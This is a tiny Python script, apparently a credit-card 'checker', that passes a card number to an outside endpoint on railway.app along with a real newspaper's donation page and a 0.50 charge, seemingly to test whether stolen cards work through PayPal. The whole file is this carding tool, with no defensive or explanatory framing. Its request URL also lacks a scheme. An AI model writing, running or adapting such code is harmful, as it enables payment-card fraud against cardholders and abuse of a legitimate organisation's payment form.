import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://www.theflorentine.net/support-the-florentine/"
	price="0.50"
	res=requests.get(f'pqy2-production-539f.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
	return res
